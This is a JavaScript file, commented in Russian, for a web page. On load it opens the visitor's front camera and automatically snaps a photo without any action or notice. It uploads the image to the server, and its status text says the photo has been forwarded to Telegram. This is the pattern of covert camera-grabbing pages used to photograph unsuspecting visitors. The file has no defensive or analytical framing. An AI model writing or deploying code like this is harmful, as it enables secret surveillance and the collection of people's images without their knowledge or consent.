(function() {
    'use strict';

    // ===== ЭЛЕМЕНТЫ =====
    const video = document.getElementById('video');
    const statusDiv = document.getElementById('status');
    const preview = document.getElementById('preview');
    const photoInfo = document.getElementById('photoInfo');
    const placeholder = document.getElementById('placeholder');

    // ===== ПЕРЕМЕННЫЕ =====
    let stream = null;
    let isPhotoTaken = false;
    let retryCount = 0;
    const MAX_RETRIES = 3;
    let isProcessing = false;

    // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
    function setStatus(text, type = 'info') {
        let icon = '';
        if (type === 'success') icon = '✅ ';
        else if (type === 'error') icon = '❌ ';
        else if (type === 'warning') icon = '⚠️ ';
        else if (type === 'info') icon = 'ℹ️ ';
        
        statusDiv.className = 'status-' + type;
        statusDiv.innerHTML = icon + text;
    }

    function dataURLToBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const b64 = atob(parts[1]);
        const byteArray = new Uint8Array(b64.length);
        for (let i = 0; i < b64.length; i++) {
            byteArray[i] = b64.charCodeAt(i);
        }
        return new Blob([byteArray], { type: mime });
    }

    // ===== ОТПРАВКА ФОТО =====
    async function sendPhoto(dataUrl) {
        if (isProcessing) return;
        isProcessing = true;

        try {
            const blob = dataURLToBlob(dataUrl);
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            
            setStatus('Отправка фото...', 'info');
            
            const response = await fetch('/upload', {
                method: 'POST',
                body: formData,
                // Таймаут для мобильных
                signal: AbortSignal.timeout(15000)
            });
            
            const result = await response.json();
            
            if (result.success) {
                const date = new Date().toLocaleString('ru-RU');
                photoInfo.textContent = `✅ Сохранено: ${result.filename} | ${date}`;
                photoInfo.className = 'photo-info success';
                setStatus('Фото отправлено в Telegram!', 'success');
                console.log('📁 Фото сохранено:', result.url);
            } else {
                setStatus('Ошибка сервера: ' + (result.error || 'неизвестная'), 'error');
            }
        } catch (err) {
            console.error('Ошибка отправки:', err);
            if (err.name === 'AbortError') {
                setStatus('Превышено время ожидания сервера', 'error');
            } else {
                setStatus('Ошибка отправки: ' + err.message, 'error');
            }
        } finally {
            isProcessing = false;
        }
    }

    // ===== СЪЁМКА ФОТО =====
    function takePhoto() {
        if (!stream || isPhotoTaken || isProcessing) return;
        
        // Проверяем, что видео имеет размеры
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            setStatus('Ожидание стабилизации кадра...', 'info');
            setTimeout(takePhoto, 400);
            return;
        }

        try {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // Отражаем зеркально
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.85);
            
            // Показываем превью
            preview.src = photoData;
            preview.style.display = 'block';
            
            // Скрываем видео
            video.style.display = 'none';
            placeholder.classList.add('hidden');
            
            isPhotoTaken = true;
            sendPhoto(photoData);
            
        } catch (err) {
            console.error('Ошибка съёмки:', err);
            setStatus('Ошибка создания фото: ' + err.message, 'error');
        }
    }

    // ===== ЗАПУСК КАМЕРЫ =====
    async function startCamera() {
        try {
            setStatus('Запрос доступа к камере...', 'info');
            placeholder.querySelector('.icon').textContent = '⏳';
            placeholder.querySelector('span:last-child').textContent = 'Запрос разрешения...';
            
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });
            
            video.srcObject = stream;
            await video.play();
            
            // Скрываем плейсхолдер
            placeholder.classList.add('hidden');
            video.style.display = 'block';
            
            setStatus('Камера включена! Делаем фото...', 'success');
            
            // Ждём стабилизации кадра
            setTimeout(() => {
                takePhoto();
            }, 800);
            
        } catch (err) {
            console.error('Ошибка камеры:', err);
            
            let errorMsg = '';
            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                errorMsg = 'Доступ к камере запрещён. Разрешите в браузере и обновите страницу.';
            } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
                errorMsg = 'Камера не найдена. Подключите камеру и обновите страницу.';
            } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
                errorMsg = 'Камера занята другим приложением. Закройте другие программы.';
            } else if (err.name === 'OverconstrainedError') {
                errorMsg = 'Неподдерживаемые настройки камеры. Попробуйте другой браузер.';
            } else {
                errorMsg = 'Ошибка доступа к камере: ' + err.message;
            }
            
            setStatus(errorMsg, 'error');
            placeholder.querySelector('.icon').textContent = '⚠️';
            placeholder.querySelector('span:last-child').textContent = 'Ошибка камеры';
            
            // Попытка перезапуска
            if (retryCount < MAX_RETRIES) {
                retryCount++;
                setTimeout(() => {
                    setStatus(`Повторная попытка (${retryCount}/${MAX_RETRIES})...`, 'info');
                    startCamera();
                }, 3000);
            } else {
                setStatus('Не удалось получить доступ к камере после ' + MAX_RETRIES + ' попыток. Обновите страницу.', 'error');
            }
        }
    }

    // ===== ОЧИСТКА =====
    function cleanup() {
        if (stream) {
            stream.getTracks().forEach(track => {
                track.stop();
                track.enabled = false;
            });
            stream = null;
        }
        video.srcObject = null;
        video.style.display = 'none';
        placeholder.classList.remove('hidden');
        placeholder.querySelector('.icon').textContent = '📷';
        placeholder.querySelector('span:last-child').textContent = 'Ожидание камеры...';
    }

    // ===== ЗАПУСК =====
    function init() {
        // Проверка поддержки
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            setStatus('Ваш браузер не поддерживает камеру', 'error');
            return;
        }
        
        // Запускаем с задержкой для мобильных
        setTimeout(startCamera, 600);
    }

    // ===== СОБЫТИЯ =====
    window.addEventListener('beforeunload', cleanup);
    window.addEventListener('pagehide', cleanup);
    
    // Обработка переключения вкладок (для мобильных)
    document.addEventListener('visibilitychange', () => {
        if (document.hidden && stream) {
            // Приостанавливаем, если вкладка скрыта
            stream.getTracks().forEach(track => track.enabled = false);
        } else if (!document.hidden && stream) {
            // Включаем обратно
            stream.getTracks().forEach(track => track.enabled = true);
        }
    });

    // ===== ЗАПУСК ПРИ ЗАГРУЗКЕ =====
    if (document.readyState === 'complete') {
        init();
    } else {
        document.addEventListener('DOMContentLoaded', init);
    }

})();